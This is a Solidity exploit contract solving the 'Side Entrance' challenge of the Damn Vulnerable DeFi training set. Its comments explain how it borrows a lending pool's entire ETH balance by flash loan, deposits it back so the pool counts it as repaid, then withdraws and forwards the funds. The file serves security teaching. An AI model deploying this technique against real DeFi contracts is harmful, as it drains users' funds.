// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";
import {IFlashLoanEtherReceiver} from "./SideEntranceLenderPool.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

/**
 * @title SideEntranceLenderPoolExploiter
 * @dev Exploit contract for the SideEntrance challenge
 *
 * This contract exploits a critical accounting flaw in the SideEntranceLenderPool where
 * the flash loan repayment check only verifies the pool's ETH balance, not the actual
 * repayment of the borrowed funds.
 *
 * Attack Vector:
 * 1. The pool's flashLoan function lends ETH and calls execute() on the borrower
 * 2. The pool checks repayment by comparing its balance before/after the loan
 * 3. We exploit this by depositing the borrowed ETH back to the pool during execute()
 * 4. This makes the pool think it was repaid, but we now have a deposit balance
 * 5. We then withdraw our deposit, effectively draining the pool
 *
 * Root Cause: The pool conflates "repayment" with "balance restoration" and doesn't
 * distinguish between genuine repayment and new deposits during flash loan execution.
 */
contract SideEntranceLenderPoolExploiter is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    /**
     * @dev Initialize the exploiter with the target pool address
     * @param _pool Address of the SideEntranceLenderPool contract to exploit
     */
    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    /**
     * @dev Execute the complete exploit to drain the pool
     * @param _recovery Address to send the drained ETH to
     *
     * Attack Steps:
     * 1. Take a flash loan for the entire pool balance
     * 2. During the loan callback, deposit the borrowed ETH back to the pool
     * 3. The pool thinks it was repaid because its balance is restored
     * 4. Withdraw our deposit balance, draining the pool
     * 5. Transfer all stolen ETH to the recovery address
     */
    function exploit(address _recovery) external {
        // Step 1: Borrow the entire pool balance via flash loan
        // This triggers execute() callback with the borrowed ETH
        pool.flashLoan(address(pool).balance);

        // Step 4: Withdraw our deposit (the previously borrowed ETH)
        pool.withdraw();

        // Step 5: Send all stolen ETH to recovery address
        SafeTransferLib.safeTransferETH(_recovery, address(this).balance);
    }

    /**
     * @dev Flash loan callback function - executed during the loan
     * @dev This is where the exploit happens: we deposit instead of repaying
     *
     * When the pool calls this function:
     * - msg.value contains the borrowed ETH from the flash loan
     * - We deposit this ETH back to the pool instead of keeping it for repayment
     * - The pool's balance is restored, so it thinks we repaid the loan
     * - But we now have a deposit balance equal to the borrowed amount
     */
    function execute() external payable {
        // Step 2: Deposit the borrowed ETH back to the pool
        // This creates a deposit balance for us while restoring the pool's balance
        pool.deposit{value: msg.value}();
    }

    /**
     * @dev Fallback function to receive ETH from pool withdrawals
     * @dev Required to receive ETH when withdraw() is called
     */
    receive() external payable {}
}
